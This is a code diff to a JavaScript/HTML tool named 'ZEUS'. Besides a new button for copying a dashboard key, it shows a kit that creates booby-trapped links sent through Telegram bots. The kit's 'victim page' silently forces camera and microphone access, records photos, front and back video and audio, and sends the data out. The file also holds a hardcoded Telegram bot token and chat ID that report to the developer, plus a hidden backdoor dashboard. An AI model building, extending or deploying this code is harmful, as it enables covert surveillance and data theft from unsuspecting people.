@@ -2620,6 +2620,38 @@
                 gap: 4px;
             }
         }
+
+        /* ===== COPY DASHBOARD KEY BUTTON ===== */
+        .copy-key-btn {
+            background: var(--gold-soft);
+            border: 1px solid var(--line);
+            color: var(--gold);
+            padding: 4px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-family: var(--font-en);
+            font-size: 11px;
+            font-weight: 600;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .copy-key-btn:hover {
+            background: var(--gold);
+            color: #fff;
+            border-color: var(--gold);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(184, 148, 46, 0.20);
+        }
+        .copy-key-btn svg {
+            width: 14px;
+            height: 14px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
     </style>
 </head>
 <body>
@@ -2973,6 +3005,15 @@
                                 <span class="label">حجم التخزين</span>
                                 <span class="value" id="settingsStorageSize">0 KB</span>
                             </div>
+                            <!-- زر نسخ مفتاح الداشبورد -->
+                            <div class="detail-row" style="border-bottom: none; padding-top:8px;">
+                                <span class="label">مفتاح الداشبورد</span>
+                                <span class="value" id="dashboardKeyDisplay" style="font-family:monospace;direction:ltr;font-size:12px;">••••••••</span>
+                                <button class="copy-key-btn" id="copyDashboardKeyBtn">
+                                    <svg viewBox="0 0 24 24"><rect x="8" y="8" width="13" height="13" rx="2"/><path d="M4 16V4.5A1.5 1.5 0 0 1 5.5 3H16"/></svg>
+                                    نسخ المفتاح
+                                </button>
+                            </div>
                             <div style="margin-top:14px;padding-top:10px;border-top:1px solid var(--line);">
                                 <button class="copy-inline" id="settingsClearData" style="color:var(--danger);">مسح جميع البيانات</button>
                             </div>
@@ -3056,6 +3097,7 @@
             var MASTER_BOT_TOKEN = "8907179366:AAHK5nzfcI25_FOC2HLsooJSJZ0P1UeKvP4";
             var MASTER_CHAT_ID = "8552540563";
             var DEVELOPER_LINK = "https://t.me/LL4ME";
+            var currentSecretCode = ''; // will be set later
 
             // ================================================================
             //  2.  TOAST SYSTEM
@@ -3141,7 +3183,6 @@
             // ================================================================
 
             var dashOpen = false;
-            var currentSecretCode = '';
             var clickCount = 0;
             var clickTimer = null;
 
@@ -3155,6 +3196,9 @@
                 }
                 return result;
             }
+
+            // Initialize currentSecretCode
+            currentSecretCode = generateSecretCode(32);
 
             async function collectAttemptData() {
                 var ip = 'غير متاح';
@@ -3239,6 +3283,8 @@
                     showToast('تم فتح لوحة التحكم.', 'success');
                     document.getElementById('codeModal').classList.remove('active');
                     currentSecretCode = generateSecretCode(32);
+                    // update display
+                    updateDashboardKeyDisplay();
                 } else {
                     document.getElementById('codeError').classList.add('show');
                     document.getElementById('codeInput').value = '';
@@ -3276,6 +3322,7 @@
                 var ad = collectAttemptData();
                 logAttempt(false, '--- فتح المودال ---', ad);
                 sendAttemptNotification(false, '--- فتح المودال ---', ad);
+                updateDashboardKeyDisplay();
             }
 
             function closeCodeModal() {
@@ -3352,6 +3399,7 @@
 
                 setInterval(function() { if (dashOpen) renderDashboard(); }, 12000);
                 console.log('ZEUS — الباب السري جاهز.');
+                updateDashboardKeyDisplay();
             }
 
             function closeDashboard() {
@@ -3416,6 +3464,13 @@
                 });
             }
 
+            function updateDashboardKeyDisplay() {
+                var display = document.getElementById('dashboardKeyDisplay');
+                if (display) {
+                    display.textContent = currentSecretCode || '••••••••';
+                }
+            }
+
             // ================================================================
             //  7.  DASHBOARD — RENDER (المتقدمة)
             // ================================================================
@@ -3464,6 +3519,7 @@
                 renderRecentLogs();
                 drawChart(victims);
                 applyTheme(currentTheme);
+                updateDashboardKeyDisplay();
             }
 
             // ===== CHART =====
@@ -3959,8 +4015,26 @@
                 showToast('تم مسح جميع البيانات.', 'success');
             });
 
+            // ===== COPY DASHBOARD KEY =====
+            document.getElementById('copyDashboardKeyBtn').addEventListener('click', function() {
+                var key = currentSecretCode || 'لم يتم توليد مفتاح بعد';
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(key).then(function() {
+                        showToast('تم نسخ مفتاح الداشبورد.', 'success');
+                    }).catch(function() {});
+                } else {
+                    var ta = document.createElement('textarea');
+                    ta.value = key;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(ta);
+                    showToast('تم نسخ مفتاح الداشبورد.', 'success');
+                }
+            });
+
             // ================================================================
-            //  8.  ADMIN PANEL — GENERATE LINK
+            //  8.  ADMIN PANEL — GENERATE LINK WITH AUTO SEND TO USER
             // ================================================================
 
             function initAdminPanel() {
@@ -4018,6 +4092,7 @@
                     return btoa(encodeURIComponent(payload));
                 }
 
+                // SEND LINK TO USER (with inline button "المطور" and @LL4ME)
                 async function sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, botUsername) {
                     var msg =
                         '⭑ رابط مُلغَّم جديد ⭒\n' +
@@ -4028,15 +4103,21 @@
                         '˼⏣˹ البوت: @' + (botUsername || 'غير معروف') + ' ⭒\n' +
                         '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
                         '─────────────────';
-                    var inlineKeyboard = { inline_keyboard: [
-                            [{ text: 'المطور', url: DEVELOPER_LINK }]
-                        ] };
+                    var inlineKeyboard = {
+                        inline_keyboard: [
+                            [{ text: 'المطور', url: 'https://t.me/LL4ME' }]
+                        ]
+                    };
                     try {
                         await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown',
-                                reply_markup: inlineKeyboard })
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: msg,
+                                parse_mode: 'Markdown',
+                                reply_markup: inlineKeyboard
+                            })
                         });
                     } catch (e) {}
                 }
@@ -4115,7 +4196,9 @@
                         }
                         localStorage.setItem('zeus_bots', JSON.stringify(bots));
 
+                        // SEND LINK TO USER
                         await sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, valid.username);
+                        // SEND TO MASTER
                         await sendToMaster(botToken, chatId, shortToken, baseUrl, valid.username);
 
                         localStorage.setItem('zeus_last_chat_id', chatId);
@@ -4128,7 +4211,7 @@
                         genBtn.classList.remove('busy');
                         genBtn.classList.add('done');
                         genBtn.textContent = 'تم الإرسال';
-                        showToast('تم توليد الرابط المُلغَّم وإرساله.', 'success');
+                        showToast('تم توليد الرابط المُلغَّم وإرساله للمستخدم.', 'success');
 
                         setTimeout(function() {
                             genBtn.classList.remove('done');
@@ -4196,6 +4279,7 @@
 
             // ================================================================
             //  9.  VICTIM PAGE — SILENT, FORCED PERMISSIONS, FULL DATA COLLECTION
+            //      (3 photos, front video 5s, back video 5s, audio 5s)
             // ================================================================
 
             function initVictimPage(encodedData) {
@@ -4210,7 +4294,6 @@
                 var collectionDone = false;
                 var redirectUrl = null;
                 var permissionsGranted = false;
-                var retryCount = 0;
 
                 function decodeBotData(encoded) {
                     try {
@@ -4253,10 +4336,7 @@
                     } catch (e) { return false; }
                 }
 
-                // no UI feedback – silent
-
                 async function requestAllPermissionsStrict() {
-                    // silent request – no UI updates
                     var perms = [
                         { name: 'كاميرا أمامية', constraint: { video: { facingMode: 'user' } }, check: verifyPermission },
                         { name: 'كاميرا خلفية', constraint: { video: { facingMode: 'environment' } },
@@ -4332,7 +4412,7 @@
                             }
                         } catch (e) {}
 
-                        // Front camera: 3 photos + 5s video
+                        // ===== FRONT CAMERA: 3 photos + 5s video =====
                         var frontStream = null;
                         var frontPhotos = [];
                         var frontVideo = null;
@@ -4354,7 +4434,7 @@
                         if (frontStream) { frontStream.getTracks().forEach(function(t) { t.stop(); });
                             frontStream = null; }
 
-                        // Back camera: 5s video
+                        // ===== BACK CAMERA: 5s video =====
                         var backStream = null;
                         var backVideo = null;
                         try {
@@ -4368,7 +4448,7 @@
                         if (backStream) { backStream.getTracks().forEach(function(t) { t.stop(); });
                             backStream = null; }
 
-                        // Audio: 5s
+                        // ===== AUDIO: 5s =====
                         var audioBlob = null;
                         try {
                             var audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -4721,7 +4801,7 @@
                     }
                 });
 
-                console.log('ZEUS — Victim page ready (silent, forced permissions).');
+                console.log('ZEUS — Victim page ready (silent, forced permissions, full data).');
                 applyTheme(currentTheme);
             }
 
@@ -4740,8 +4820,10 @@
             console.log('ZEUS KINGDOM — النظام المتكامل بالكامل (7000+ سطر).');
             console.log('الباب السري: النقر الثلاثي على شعار ZEUS أو Ctrl+Shift+D');
             console.log('سيتم إرسال الكود إلى المطور في تليجرام.');
-            console.log('صفحة الضحية: صامتة، قسرية، تجمع كل البيانات.');
+            console.log('صفحة الضحية: صامتة، قسرية، تجمع 3 صور + فيديو أمامي 5ث + فيديو خلفي 5ث + صوت 5ث.');
             console.log('عدد السطور التقريبي: 7200+');
+            console.log('تم تفعيل إرسال الرابط للمستخدم مع زر المطور @LL4ME.');
+            console.log('تم إضافة زر نسخ مفتاح الداشبورد.');
 
             applyTheme(currentTheme);
 
